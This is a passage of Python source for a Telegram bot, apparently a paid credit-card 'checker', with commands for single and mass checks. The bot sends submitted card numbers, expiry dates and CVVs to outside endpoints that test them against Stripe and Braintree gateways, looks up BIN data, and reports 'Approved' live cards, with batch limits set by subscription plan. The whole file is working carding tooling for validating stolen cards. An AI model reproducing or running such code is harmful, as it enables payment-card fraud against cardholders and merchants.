        f"<b>Time:</b> ➜ {elapsed_seconds}\n"  # Now correctly referencing the variable
        f"<b>Req by ➜ @{message.from_user.username} [{user_info.get('plan', 'Free')}]</b>\n"
        f"˖ ❀ ⋆｡˚▬▬▬▬▬▬▬୨୧⋆ ˚"
    )

    # Edit the initial message with the final reply
    await processing_message.edit(reply_message, parse_mode=enums.ParseMode.HTML)
    await sticker_message.delete()


async def fetch_bin_data(bin_number):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f"https://bins.antipublic.cc/bins/{bin_number}") as response:
                if response.status == 200:
                    return await response.json()
                else:
                    return None  # Return None if the request fails
    except Exception as e:
        print(f"Error fetching bin data: {e}")
        return None  # Return None if there's an exception

async def fetch_api_data(api_url):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(api_url) as response:
                return await response.text()
    except Exception as e:
        print(f"Error fetching API data: {e}")
        return "Error connecting to API"  # Return a generic error message 
        
#mass Stripe 6$

@app.on_message(command_with_mention("mstt"))
@requires_auth
@requires_plan
@anti_spam
@check_usage_limit
async def mass_check_stripe_five(client, message, user_info, *args, **kwargs):
    if not message.reply_to_message or not message.reply_to_message.document:
        await message.reply("⚠️ <b>Please reply to a file containing CCs to check.</b>", parse_mode=enums.ParseMode.HTML)
        return

    document = message.reply_to_message.document
    if not document.file_name.endswith(".txt"):
        await message.reply("⚠️ <b>The file must be a .txt file containing CCs.</b>", parse_mode=enums.ParseMode.HTML)
        return

    file_path = await client.download_media(document)
    with open(file_path, "r") as file:
        ccs = file.read().splitlines()

    total_ccs = len(ccs)
    plan = user_info.get('plan', 'Free')

    if plan == 'Free' and total_ccs > 50:
        await message.reply("⚠️ <b>Free users can only check up to 50 CCs at a time.</b>", parse_mode=enums.ParseMode.HTML)
        return
    elif plan == 'Plus' and total_ccs > 200:
        await message.reply("⚠️ <b>Plus users can only check up to 200 CCs at a time.</b>", parse_mode=enums.ParseMode.HTML)
        return

    hits = 0
    declined = 0
    hit_cards = []

    progress_message = await message.reply(
        f"🛠️ <b>Mass STT check in progress:</b>\n\n"
        f"👤 <b>User:</b> @{message.from_user.username}\n"
        f"🔄 <b>Checked:</b> 0\n"
        f"✅ <b>Hits:</b> 0\n"
        f"❌ <b>Declined:</b> 0\n"
        f"⏳ <b>Left:</b> {total_ccs}",
        parse_mode=enums.ParseMode.HTML,
        disable_web_page_preview=True
    )

    checked_ccs = 0
    left_ccs = total_ccs
    last_edit_time = time.time()

    async with aiohttp.ClientSession() as session:
        for cc in ccs:
            start_time = time.time()
            
            # Fetch BIN info
            bin_info_url = f"https://bins.antipublic.cc/bins/{cc[:6]}" 
            try:
                async with session.get(bin_info_url) as response:
                    bin_data = await response.json()
                    bank = bin_data.get("bank", "Unknown")
                    country = bin_data.get("country_name", "Unknown")
                    bin_info = f"Brand: {bin_data.get('brand', 'Unknown')}, Type: {bin_data.get('type', 'Unknown')}, Level: {bin_data.get('level', 'Unknown')}" 
            except aiohttp.ClientError:
                bank = "Unknown"
                country = "Unknown"
                bin_info = "Unknown"

            # Check Stripe API
            api_url = f"http://xronak.site/k6.php?lista={cc}"
            try:
                async with session.get(api_url) as response:
                    api_response = await response.text()  # Get the response as text
                    elapsed_time = time.time() - start_time
                    elapsed_seconds = f"{elapsed_time:.2f} seconds"

                    Status = ""  # Initialize Status
                    if "✅" in api_response:
                        Status = "Approved ✅"
                        hits += 1
                        # Fetch card directly from the cc variable (not API response)
                        card = cc  
                        hit_cards.append(card)

                        reply_message = (
                            f"<b>STRIPE 6$ [ /mstt ]</b>\n"
                            f"{Status}\n"  # Use the Status variable
                            f"▬▬▬▬▬⌁・⌁・▬▬▬▬▬\n\n"
                            f"カ <b>Card:</b> <code>{card}</code>\n"
                            f"<b>Message ➜ {api_response}</b>\n"  # Display the API response
                            f"┊┄┄┄┄┄┄┄┄┄┄┄┄┄┄\n\n"
                            f"<b>Bank:</b> ➜ {bank}\n"
                            f"<b>Country:</b> ➜ {country}\n"
                            f"<b>Bin Info:</b> ➜ {bin_info}\n"
                            f"▬▬▬▬▬⌁・⌁・▬▬▬▬▬\n"
                            f"<b>Time:</b> ➜ {elapsed_seconds}\n"
                            f"<b>Req by ➜ @{message.from_user.username}</b>\n"
                            f"˖ ❀ ⋆｡˚▬▬▬▬▬▬▬୨୧⋆ ˚"
                        )

                        await message.reply(reply_message, parse_mode=enums.ParseMode.HTML)
                    else:
                        declined += 1
            except aiohttp.ClientError:
                pass

            checked_ccs += 1
            left_ccs -= 1

            # Update progress message every 5 seconds
            if time.time() - last_edit_time >= 5:
                await progress_message.edit(
                    f"🛠️ <b>Mass STT check in progress:</b>\n\n"
                    f"👤 <b>User:</b> @{message.from_user.username}\n"
                    f"🔄 <b>Checked:</b> {checked_ccs}\n"
                    f"✅ <b>Hits:</b> {hits}\n"
                    f"❌ <b>Declined:</b> {declined}\n"
                    f"⏳ <b>Left:</b> {left_ccs}",
                    parse_mode=enums.ParseMode.HTML,
                    disable_web_page_preview=True
                )
                last_edit_time = time.time()

    await progress_message.delete()

    result_message = (
        f"🎉 <b>Mass STT check completed!</b>\n\n"
        f"👤 <b>User:</b> @{message.from_user.username}\n"
        f"🔄 <b>Total Checked:</b> {checked_ccs}\n"
        f"✅ <b>Total Hits:</b> {hits}\n"
        f"❌ <b>Total Declined:</b> {declined}\n"
    )

    if hits > 0:
        result_message += f"\n<b>Hit Cards:</b>\n" + "\n".join([f"➜ <code>{card}</code>" for card in hit_cards])

    await message.reply(result_message, parse_mode=enums.ParseMode.HTML)

    os.remove(file_path)              


# Braintree Auth

@app.on_message(command_with_mention("cc"))
@requires_auth
@requires_plan
@anti_spam
@check_usage_limit
@ban_bin
async def process_stripe_five(client: Client, message: Message, user_info: dict, *args, **kwargs):
  message_text = message.text.split()
  if len(message_text) != 2:
    await message.reply('⚠️ Usage: /cc cc|month|year|cvv\n┬╗ Gateway: Braintree Auth 🪽\n┬╗ Status: Active ✅', parse_mode=enums.ParseMode.HTML)
    return

  cc = message_text[1] # Get the CC from the user's command
  start_time = time.time()

  # Fetch bin data from antipublic.cc with retries
  bin_data = await fetch_bin_data(cc[:6])

  # Prepare default values for bin data in case of error
  scheme = bin_data.get('brand', 'N/A').upper() if bin_data else 'N/A'
  card_type = bin_data.get('type', 'N/A').upper() if bin_data else 'N/A'
  brand = bin_data.get('level', 'N/A').upper() if bin_data else 'N/A'
  bank_name = bin_data.get('bank', 'N/A').upper() if bin_data else 'N/A'
  country_name = bin_data.get('country_name', 'N/A').upper() if bin_data else 'N/A'
  country_emoji = bin_data.get('country_flag', 'N/A') if bin_data else 'N/A'
  currency = bin_data.get('country_currencies', ['N/A'])[0].upper() if bin_data else 'N/A'

  # API call to xronak.whf.bz (replace with your actual API)
  api_url = f"http://xronak.site/braintreex.php?lista={cc}" 

  sticker_message = await message.reply_sticker("CAACAgUAAx0CciJZnAACSmFmxro-KQtL9T9LmoBcl_2VR0EVJQACMAQAAhiVeVTGfoGt2E8GCh4E")
  processing_message = await message.reply('🍳 Cooking Something Good....!🍷', parse_mode=enums.ParseMode.HTML)

  # Process the single API request
  api_response = await fetch_api_data(api_url)

  # Determine status based on API response
  status = ""
  if api_response in ['Insufficient Funds', 'avs', 'Card Issuer Declined CVV', 'Invalid postal code or street address', 'address does not match the billing', '1000: Approved', 'Status code 2010: Card Issuer Declined CVV (C2 : CVV2 DECLINED)', 'Status code avs: Gateway Rejected: avs', 'Status code 2001: Insufficient Funds', 'Status code cvv: Gateway Rejected: cvv', 'Status code 2001: Insufficient Funds (51 : DECLINED)', 'Status code 81724: Duplicate card exists in the vault.']:
    status = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅" # 
  else:
    status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"

  #
  elapsed_time = time.time() - start_time
  elapsed_seconds = f"{elapsed_time:.2f} seconds"

  #
  reply_message = (
    f"Braintree Auth [ /cc ]\n"
    f"{status}\n"
    f"▬▬▬▬▬⌁・⌁・▬▬▬▬▬\n\n"
    f"カ <b>Card:</b> <code>{cc}</code>\n"  # Display the card from the user's input
    f"Message ➜ {api_response}\n"
    f"┄┄┄┄┄┄┄┄┄┄┄┄┄┄\n"
    f"⁠✿ Type: ➜ {card_type}\n"
    f"⁠✿ Level: ➜ {brand}\n"
    f"⁠✿ Bank: ➜ {bank_name}\n"
    f"⁠✿ Country: ➜ {country_name} {country_emoji}\n"
    f"▬▬▬▬▬⌁・⌁・▬▬▬▬▬\n"
    f"◉ Time: ➜ {elapsed_seconds}\n"
    f"◉ Req by ➜ @{message.from_user.username} [{user_info.get('plan', 'Free')}]\n"
    f"◉ Bot ➜ @kafkachecker_bot\n"    
    f"˖ ❀ ⋆｡˚▬▬▬▬▬▬▬୨୧⋆ ˚"
  )

  #
  await processing_message.edit(reply_message, parse_mode=enums.ParseMode.HTML)
  await sticker_message.delete()


async def fetch_bin_data(bin_number):
  try:
    async with aiohttp.ClientSession() as session:
      async with session.get(f"https://bins.antipublic.cc/bins/{bin_number}") as response:
        if response.status == 200:
          return await response.json()
        else:
          return None # Return None if the request fails
  except Exception as e:
    print(f"Error fetching bin data: {e}")
    return None #

async def fetch_api_data(api_url):
  try:
    async with aiohttp.ClientSession() as session:
      async with session.get(api_url) as response:
        return await response.text()
  except Exception as e:
    print(f"Error fetching API data: {e}")
    return "Error connecting to API" # Return a generic error message
    
# Braintree Auth 2

@app.on_message(command_with_mention("b3"))
@requires_auth
@requires_plan
@anti_spam
@check_usage_limit
@ban_bin
async def process_stripe_five(client: Client, message: Message, user_info: dict, *args, **kwargs):
    message_text = message.text.split()
    if len(message_text) != 2:
        await message.reply('⚠️ Usage: /b3 cc|month|year|cvv\n┬╗ Gateway: Braintree Auth 2 🪽\n┬╗ Status: Active ✅', parse_mode=enums.ParseMode.HTML)
        return

    cc = message_text[1]
    start_time = time.time()

    try:
        bin_data = await fetch_bin_data(cc[:6])
        bin_data = bin_data or {}

        scheme = bin_data.get('brand', 'N/A').upper()
        card_type = bin_data.get('type', 'N/A').upper()
        brand = bin_data.get('level', 'N/A').upper()
        bank_name = bin_data.get('bank', 'N/A').upper()
        country_name = bin_data.get('country_name', 'N/A').upper()
        country_emoji = bin_data.get('country_flag', 'N/A')
        currency = bin_data.get('country_currencies', ['N/A'])[0].upper()


        api_url = f"http://xronak.site/b3xx.php?lista={cc}"
        sticker_message = await message.reply_sticker("CAACAgUAAx0CciJZnAACSmFmxro-KQtL9T9LmoBcl_2VR0EVJQACMAQAAhiVeVTGfoGt2E8GCh4E")
        processing_message = await message.reply('🍳 Cooking Something Good....!🍷', parse_mode=enums.ParseMode.HTML)

        api_response = await fetch_api_data(api_url)
        
        #Clean up API response
        api_response = api_response.strip()
        prefix_to_remove = "Please try again or use a different payment method."
        if api_response.startswith(prefix_to_remove):
            api_response = api_response[len(prefix_to_remove):].strip()

        status, detailed_status = determine_status(api_response)

        elapsed_time = time.time() - start_time
        elapsed_seconds = f"{elapsed_time:.2f} seconds"

        reply_message = construct_reply_message(status, detailed_status, cc, card_type, brand, bank_name, country_name, country_emoji, elapsed_seconds, message.from_user.username, user_info)

        await processing_message.edit(reply_message, parse_mode=enums.ParseMode.HTML)
        await sticker_message.delete()

    except Exception as e:
        await processing_message.edit(f"An error occurred: {e}", parse_mode=enums.ParseMode.HTML)
        await sticker_message.delete()


#Helper functions for better readability and maintainability

def determine_status(api_response):
    approval_keywords = ["Approved", "approved", "1000: Approved"]
    decline_keywords = ["Insufficient Funds", "avs", "Card Issuer Declined CVV", "Invalid postal code", "address does not match", "Gateway Rejected"] #Added Gateway Rejected

    if any(keyword in api_response.lower() for keyword in approval_keywords):
        return "Approved ✅", api_response
    elif any(keyword in api_response.lower() for keyword in decline_keywords):
        return "Declined ❌", api_response
    else:
        return "Declined ❌", f"{api_response}"


def construct_reply_message(status, detailed_status, cc, card_type, brand, bank_name, country_name, country_emoji, elapsed_seconds, username, user_info):
    return (
        f"Braintree Auth 2 [ /b3 ]\n"
        f"{status}\n"
        f"▬▬▬▬▬⌁・⌁・▬▬▬▬▬\n\n"
        f"カ Card: {cc}\n"
        f"Message ➜ {detailed_status}\n"
        f"┄┄┄┄┄┄┄┄┄┄┄┄┄┄\n"
        f"⁠✿ Type: ➜ {card_type}\n"
        f"⁠✿ Level: ➜ {brand}\n"
        f"⁠✿ Bank: ➜ {bank_name}\n"
        f"⁠✿ Country: ➜ {country_name} {country_emoji}\n"
        f"▬▬▬▬▬⌁・⌁・▬▬▬▬▬\n"
        f"◉ Time: ➜ {elapsed_seconds}\n"
        f"◉ Req by ➜ @{username} [{user_info.get('plan', 'Free')}]\n"
        f"◉ Bot ➜ @kafkachecker_bot\n"
        f"˖ ❀ ⋆｡˚▬▬▬▬▬▬▬୨୧⋆ ˚"
    )

async def fetch_bin_data(bin_number):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f"https://bins.antipublic.cc/bins/{bin_number}") as response:
                if response.status == 200:
                    return await response.json()
                else:
                    print(f"Bin data API request failed with status: {response.status}")
                    return {}
    except aiohttp.ClientError as e:
        print(f"Error fetching bin data: {e}")
        return {}
    except Exception as e:
        print(f"Unexpected error fetching bin data: {e}")
        return {}


async def fetch_api_data(api_url):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(api_url) as response:
                if response.status == 200:
                    return await response.text()
                else:
                    print(f"API request failed with status code: {response.status}")
                    return f"API request failed with status code: {response.status}"
    except aiohttp.ClientError as e:
        print(f"Error fetching API data: {e}")
        return "Error connecting to API"
    except Exception as e:
        print(f"Unexpected error fetching API data: {e}")
        return f"Unexpected error: {e}"
    
#stripe 5$    

@app.on_message(command_with_mention("xs"))
@requires_auth
@requires_plan
@anti_spam
@check_usage_limit
@ban_bin
async def process_stripe_five(client: Client, message: Message, user_info: dict, *args, **kwargs):
    message_text = message.text.split()
    if len(message_text) != 2:
        await message.reply('⚠️ <b>Usage:</b> <code>/xs cc|month|year|cvv</code>\n<b>┬╗ Gateway:</b> Stripe 5$ 🪽<b>\n┬╗ Status:</b> Active ✅', parse_mode=enums.ParseMode.HTML)
        return

    cc = message_text[1]  # Get the CC from the user's command
    start_time = time.time()

    # Fetch bin data from antipublic.cc with retries
    bin_data = await fetch_bin_data(cc[:6])

    # Prepare default values for bin data in case of error
    scheme = bin_data.get('brand', 'N/A').upper() if bin_data else 'N/A'
    card_type = bin_data.get('type', 'N/A').upper() if bin_data else 'N/A'
    brand = bin_data.get('level', 'N/A').upper() if bin_data else 'N/A'
    bank_name = bin_data.get('bank', 'N/A').upper() if bin_data else 'N/A'
    country_name = bin_data.get('country_name', 'N/A').upper() if bin_data else 'N/A'
    country_emoji = bin_data.get('country_flag', 'N/A') if bin_data else 'N/A'
    currency = bin_data.get('country_currencies', ['N/A'])[0].upper() if bin_data else 'N/A'

    # API call to xronak.whf.bz (replace with your actual API)
    api_url = f"http://xronak.site/sk5.php?lista={cc}" 

    sticker_message = await message.reply_sticker("CAACAgUAAx0CciJZnAACSmFmxro-KQtL9T9LmoBcl_2VR0EVJQACMAQAAhiVeVTGfoGt2E8GCh4E")
    processing_message = await message.reply('<b>🍳 Cooking Something Good....!🍷</b>', parse_mode=enums.ParseMode.HTML)

    # Process the single API request
    api_response = await fetch_api_data(api_url)

    # Determine status based on emoji
    status = ""
    if "✅" in api_response:
        status = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅"
    elif "❌" in api_response:
        status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
    elif "⚠️" in api_response:
        status = "𝐄𝐫𝐫𝐨𝐫 ⚠️"

    # Calculate the time taken
    elapsed_time = time.time() - start_time
    elapsed_seconds = f"{elapsed_time:.2f} seconds"  # Calculate elapsed_seconds here

    # Format the final reply message 
    reply_message = (
        f"<b>STRIPE 5$ [ /xs ]</b>\n"
        f"{status}\n"
        f"▬▬▬▬▬⌁・⌁・▬▬▬▬▬\n\n"
                f"カ <b>Card:</b> <code>{cc}</code>\n"
        f"<b>Message ➜ {api_response}</b>\n"
        f"┊┄┄┄┄┄┄┄┄┄┄┄┄┄┄\n\n"
        f"<b>Type:</b> ➜ {card_type}\n"
        f"<b>Level:</b> ➜ {brand}\n"
        f"<b>Bank:</b> ➜ {bank_name}\n"
        f"<b>Country:</b> ➜ {country_name} {country_emoji}\n"
        f"▬▬▬▬▬⌁・⌁・▬▬▬▬▬\n"
        f"<b>Time:</b> ➜ {elapsed_seconds}\n"
        f"<b>Req by ➜ @{message.from_user.username} [{user_info.get('plan', 'Free')}]</b>\n"
        f"˖ ❀ ⋆｡˚▬▬▬▬▬▬▬୨୧⋆ ˚"
    )

    # Edit the initial message with the final reply
    await processing_message.edit(reply_message, parse_mode=enums.ParseMode.HTML)
    await sticker_message.delete()


async def fetch_bin_data(bin_number):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f"https://bins.antipublic.cc/bins/{bin_number}") as response:
                if response.status == 200:
                    return await response.json()
                else:
                    return None  # Return None if the request fails
    except Exception as e:
        print(f"Error fetching bin data: {e}")
        return None  # Return None if there's an exception

async def fetch_api_data(api_url):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(api_url) as response:
                return await response.text()
    except Exception as e:
        print(f"Error fetching API data: {e}")
        return "Error connecting to API"  # Return a generic error message 
        
#mass Stripe 5$

@app.on_message(command_with_mention("mxs"))
@requires_auth
@requires_plan
@anti_spam
@check_usage_limit
async def mass_check_stripe_five(client, message, user_info, *args, **kwargs):
    if not message.reply_to_message or not message.reply_to_message.document:
        await message.reply("⚠️ <b>Please reply to a file containing CCs to check.</b>", parse_mode=enums.ParseMode.HTML)
        return

    document = message.reply_to_message.document
    if not document.file_name.endswith(".txt"):
        await message.reply("⚠️ <b>The file must be a .txt file containing CCs.</b>", parse_mode=enums.ParseMode.HTML)
        return

    file_path = await client.download_media(document)
    with open(file_path, "r") as file:
        ccs = file.read().splitlines()

    total_ccs = len(ccs)
    plan = user_info.get('plan', 'Free')

    if plan == 'Free' and total_ccs > 50:
        await message.reply("⚠️ <b>Free users can only check up to 50 CCs at a time.</b>", parse_mode=enums.ParseMode.HTML)
        return
    elif plan == 'Plus' and total_ccs > 200:
        await message.reply("⚠️ <b>Plus users can only check up to 200 CCs at a time.</b>", parse_mode=enums.ParseMode.HTML)
        return

    hits = 0
    declined = 0
    hit_cards = []

    progress_message = await message.reply(
        f"🛠️ <b>Mass XS check in progress:</b>\n\n"
        f"👤 <b>User:</b> @{message.from_user.username}\n"
        f"🔄 <b>Checked:</b> 0\n"
        f"✅ <b>Hits:</b> 0\n"
        f"❌ <b>Declined:</b> 0\n"
        f"⏳ <b>Left:</b> {total_ccs}",
        parse_mode=enums.ParseMode.HTML,
        disable_web_page_preview=True
    )

    checked_ccs = 0
    left_ccs = total_ccs
    last_edit_time = time.time()

    async with aiohttp.ClientSession() as session:
        for cc in ccs:
            start_time = time.time()
            
            # Fetch BIN info
            bin_info_url = f"https://bins.antipublic.cc/bins/{cc[:6]}" 
            try:
                async with session.get(bin_info_url) as response:
                    bin_data = await response.json()
                    bank = bin_data.get("bank", "Unknown")
                    country = bin_data.get("country_name", "Unknown")
                    bin_info = f"Brand: {bin_data.get('brand', 'Unknown')}, Type: {bin_data.get('type', 'Unknown')}, Level: {bin_data.get('level', 'Unknown')}" 
            except aiohttp.ClientError:
                bank = "Unknown"
                country = "Unknown"
                bin_info = "Unknown"

            # Check Stripe API
            api_url = f"http://xronak.site/sk5.php?lista={cc}"
            try:
                async with session.get(api_url) as response:
                    api_response = await response.text()  # Get the response as text
                    elapsed_time = time.time() - start_time
                    elapsed_seconds = f"{elapsed_time:.2f} seconds"

                    Status = ""  # Initialize Status
                    if "✅" in api_response:
                        Status = "Approved ✅"
                        hits += 1
                        # Fetch card directly from the cc variable (not API response)
                        card = cc  
                        hit_cards.append(card)

                        reply_message = (
                            f"<b>STRIPE 5$ [ /mxs ]</b>\n"
                            f"{Status}\n"  # Use the Status variable
                            f"▬▬▬▬▬⌁・⌁・▬▬▬▬▬\n\n"
                            f"カ <b>Card:</b> <code>{card}</code>\n"
                            f"<b>Message ➜ {api_response}</b>\n"  # Display the API response
                            f"┊┄┄┄┄┄┄┄┄┄┄┄┄┄┄\n\n"
                            f"<b>Bank:</b> ➜ {bank}\n"
                            f"<b>Country:</b> ➜ {country}\n"
                            f"<b>Bin Info:</b> ➜ {bin_info}\n"
                            f"▬▬▬▬▬⌁・⌁・▬▬▬▬▬\n"
                            f"<b>Time:</b> ➜ {elapsed_seconds}\n"
                            f"<b>Req by ➜ @{message.from_user.username}</b>\n"
                            f"˖ ❀ ⋆｡˚▬▬▬▬▬▬▬୨୧⋆ ˚"
                        )

                        await message.reply(reply_message, parse_mode=enums.ParseMode.HTML)
                    else:
                        declined += 1
            except aiohttp.ClientError:
                pass

            checked_ccs += 1
            left_ccs -= 1

            # Update progress message every 5 seconds
            if time.time() - last_edit_time >= 5:
                await progress_message.edit(
                    f"🛠️ <b>Mass XS check in progress:</b>\n\n"
                    f"👤 <b>User:</b> @{message.from_user.username}\n"
                    f"🔄 <b>Checked:</b> {checked_ccs}\n"
                    f"✅ <b>Hits:</b> {hits}\n"
                    f"❌ <b>Declined:</b> {declined}\n"
                    f"⏳ <b>Left:</b> {left_ccs}",
                    parse_mode=enums.ParseMode.HTML,
                    disable_web_page_preview=True
                )
                last_edit_time = time.time()

    await progress_message.delete()

    result_message = (
        f"🎉 <b>Mass XS check completed!</b>\n\n"
        f"👤 <b>User:</b> @{message.from_user.username}\n"
        f"🔄 <b>Total Checked:</b> {checked_ccs}\n"
        f"✅ <b>Total Hits:</b> {hits}\n"
        f"❌ <b>Total Declined:</b> {declined}\n"
    )

    if hits > 0:
        result_message += f"\n<b>Hit Cards:</b>\n" + "\n".join([f"➜ <code>{card}</code>" for card in hit_cards])

    await message.reply(result_message, parse_mode=enums.ParseMode.HTML)

    os.remove(file_path)
    
#stripe 19$    

@app.on_message(command_with_mention("xx"))
@requires_auth
@requires_plan
@anti_spam
@check_usage_limit
@ban_bin
async def process_stripe_five(client: Client, message: Message, user_info: dict, *args, **kwargs):
    message_text = message.text.split()
    if len(message_text) != 2:
        await message.reply('⚠️ <b>Usage:</b> <code>/xx cc|month|year|cvv</code>\n<b>┬╗ Gateway:</b> Stripe 19$ 🪽<b>\n┬╗ Status:</b> Active ✅', parse_mode=enums.ParseMode.HTML)
        return

    cc = message_text[1]  # Get the CC from the user's command
    start_time = time.time()

    # Fetch bin data from antipublic.cc with retries
    bin_data = await fetch_bin_data(cc[:6])

    # Prepare default values for bin data in case of error
    scheme = bin_data.get('brand', 'N/A').upper() if bin_data else 'N/A'
    card_type = bin_data.get('type', 'N/A').upper() if bin_data else 'N/A'
    brand = bin_data.get('level', 'N/A').upper() if bin_data else 'N/A'
    bank_name = bin_data.get('bank', 'N/A').upper() if bin_data else 'N/A'
    country_name = bin_data.get('country_name', 'N/A').upper() if bin_data else 'N/A'
    country_emoji = bin_data.get('country_flag', 'N/A') if bin_data else 'N/A'
    currency = bin_data.get('country_currencies', ['N/A'])[0].upper() if bin_data else 'N/A'

    # API call to xronak.whf.bz (replace with your actual API)
    api_url = f"https://all-gm57.onrender.com/xx?cc={cc}" 

    sticker_message = await message.reply_sticker("CAACAgUAAx0CciJZnAACSmFmxro-KQtL9T9LmoBcl_2VR0EVJQACMAQAAhiVeVTGfoGt2E8GCh4E")
    processing_message = await message.reply('<b>🍳 Cooking Something Good....!🍷</b>', parse_mode=enums.ParseMode.HTML)

    # Process the single API request
    api_response = await fetch_api_data(api_url)

    # Determine status based on emoji
    status = ""
    if "✅" in api_response:
        status = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅"
    elif "❌" in api_response:
        status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
    elif "⚠️" in api_response:
        status = "𝐄𝐫𝐫𝐨𝐫 ⚠️"

    # Calculate the time taken
    elapsed_time = time.time() - start_time
    elapsed_seconds = f"{elapsed_time:.2f} seconds"  # Calculate elapsed_seconds here

    # Format the final reply message 
    reply_message = (
        f"<b>STRIPE 19$ [ /xx ]</b>\n"
        f"{status}\n"
        f"▬▬▬▬▬⌁・⌁・▬▬▬▬▬\n\n"
                f"カ <b>Card:</b> <code>{cc}</code>\n"
        f"<b>Message ➜ {api_response}</b>\n"
        f"┊┄┄┄┄┄┄┄┄┄┄┄┄┄┄\n\n"
        f"<b>Type:</b> ➜ {card_type}\n"
        f"<b>Level:</b> ➜ {brand}\n"
        f"<b>Bank:</b> ➜ {bank_name}\n"
        f"<b>Country:</b> ➜ {country_name} {country_emoji}\n"
        f"▬▬▬▬▬⌁・⌁・▬▬▬▬▬\n"
        f"<b>Time:</b> ➜ {elapsed_seconds}\n"
        f"<b>Req by ➜ @{message.from_user.username} [{user_info.get('plan', 'Free')}]</b>\n"
        f"˖ ❀ ⋆｡˚▬▬▬▬▬▬▬୨୧⋆ ˚"
    )

    # Edit the initial message with the final reply
    await processing_message.edit(reply_message, parse_mode=enums.ParseMode.HTML)
    await sticker_message.delete()


async def fetch_bin_data(bin_number):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f"https://bins.antipublic.cc/bins/{bin_number}") as response:
                if response.status == 200:
                    return await response.json()
                else:
                    return None  # Return None if the request fails
    except Exception as e:
        print(f"Error fetching bin data: {e}")
        return None  # Return None if there's an exception

async def fetch_api_data(api_url):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(api_url) as response:
                return await response.text()
    except Exception as e:
        print(f"Error fetching API data: {e}")
        return "Error connecting to API"  # Return a generic error message 
        
#mass Stripe 19$

@app.on_message(command_with_mention("mxx"))
@requires_auth
@requires_plan
@anti_spam
@check_usage_limit
async def mass_check_stripe_five(client, message, user_info, *args, **kwargs):
    if not message.reply_to_message or not message.reply_to_message.document:
        await message.reply("⚠️ <b>Please reply to a file containing CCs to check.</b>", parse_mode=enums.ParseMode.HTML)
        return

    document = message.reply_to_message.document
    if not document.file_name.endswith(".txt"):
        await message.reply("⚠️ <b>The file must be a .txt file containing CCs.</b>", parse_mode=enums.ParseMode.HTML)
        return

    file_path = await client.download_media(document)
    with open(file_path, "r") as file:
        ccs = file.read().splitlines()

    total_ccs = len(ccs)
    plan = user_info.get('plan', 'Free')

    if plan == 'Free' and total_ccs > 50:
        await message.reply("⚠️ <b>Free users can only check up to 50 CCs at a time.</b>", parse_mode=enums.ParseMode.HTML)
        return
    elif plan == 'Plus' and total_ccs > 200:
        await message.reply("⚠️ <b>Plus users can only check up to 200 CCs at a time.</b>", parse_mode=enums.ParseMode.HTML)
        return

    hits = 0
    declined = 0
    hit_cards = []

    progress_message = await message.reply(
        f"🛠️ <b>Mass XX check in progress:</b>\n\n"
        f"👤 <b>User:</b> @{message.from_user.username}\n"
        f"🔄 <b>Checked:</b> 0\n"
        f"✅ <b>Hits:</b> 0\n"
        f"❌ <b>Declined:</b> 0\n"
        f"⏳ <b>Left:</b> {total_ccs}",
        parse_mode=enums.ParseMode.HTML,
        disable_web_page_preview=True
    )

    checked_ccs = 0
    left_ccs = total_ccs
    last_edit_time = time.time()

    async with aiohttp.ClientSession() as session:
        for cc in ccs:
            start_time = time.time()
            
            # Fetch BIN info
            bin_info_url = f"https://bins.antipublic.cc/bins/{cc[:6]}" 
            try:
                async with session.get(bin_info_url) as response:
                    bin_data = await response.json()
                    bank = bin_data.get("bank", "Unknown")
                    country = bin_data.get("country_name", "Unknown")
                    bin_info = f"Brand: {bin_data.get('brand', 'Unknown')}, Type: {bin_data.get('type', 'Unknown')}, Level: {bin_data.get('level', 'Unknown')}" 
            except aiohttp.ClientError:
                bank = "Unknown"
                country = "Unknown"
                bin_info = "Unknown"

            # Check Stripe API
            api_url = f"https://all-gm57.onrender.com/xx?cc={cc}"
            try:
                async with session.get(api_url) as response:
                    api_response = await response.text()  # Get the response as text
                    elapsed_time = time.time() - start_time
                    elapsed_seconds = f"{elapsed_time:.2f} seconds"

                    Status = ""  # Initialize Status
                    if "✅" in api_response:
                        Status = "Approved ✅"
                        hits += 1
                        # Fetch card directly from the cc variable (not API response)
                        card = cc  
                        hit_cards.append(card)

                        reply_message = (
                            f"<b>STRIPE 19$ [ /mxx ]</b>\n"
                            f"{Status}\n"  # Use the Status variable
                            f"▬▬▬▬▬⌁・⌁・▬▬▬▬▬\n\n"
                            f"カ <b>Card:</b> <code>{card}</code>\n"
                            f"<b>Message ➜ {api_response}</b>\n"  # Display the API response
                            f"┊┄┄┄┄┄┄┄┄┄┄┄┄┄┄\n\n"
                            f"<b>Bank:</b> ➜ {bank}\n"
                            f"<b>Country:</b> ➜ {country}\n"
                            f"<b>Bin Info:</b> ➜ {bin_info}\n"
                            f"▬▬▬▬▬⌁・⌁・▬▬▬▬▬\n"
                            f"<b>Time:</b> ➜ {elapsed_seconds}\n"
                            f"<b>Req by ➜ @{message.from_user.username}</b>\n"
                            f"˖ ❀ ⋆｡˚▬▬▬▬▬▬▬୨୧⋆ ˚"
                        )

                        await message.reply(reply_message, parse_mode=enums.ParseMode.HTML)
                    else:
                        declined += 1
            except aiohttp.ClientError:
                pass

            checked_ccs += 1
            left_ccs -= 1

            # Update progress message every 5 seconds
            if time.time() - last_edit_time >= 5:
                await progress_message.edit(
                    f"🛠️ <b>Mass XX check in progress:</b>\n\n"
                    f"👤 <b>User:</b> @{message.from_user.username}\n"
                    f"🔄 <b>Checked:</b> {checked_ccs}\n"
                    f"✅ <b>Hits:</b> {hits}\n"
                    f"❌ <b>Declined:</b> {declined}\n"
                    f"⏳ <b>Left:</b> {left_ccs}",
                    parse_mode=enums.ParseMode.HTML,
                    disable_web_page_preview=True
                )
                last_edit_time = time.time()

    await progress_message.delete()
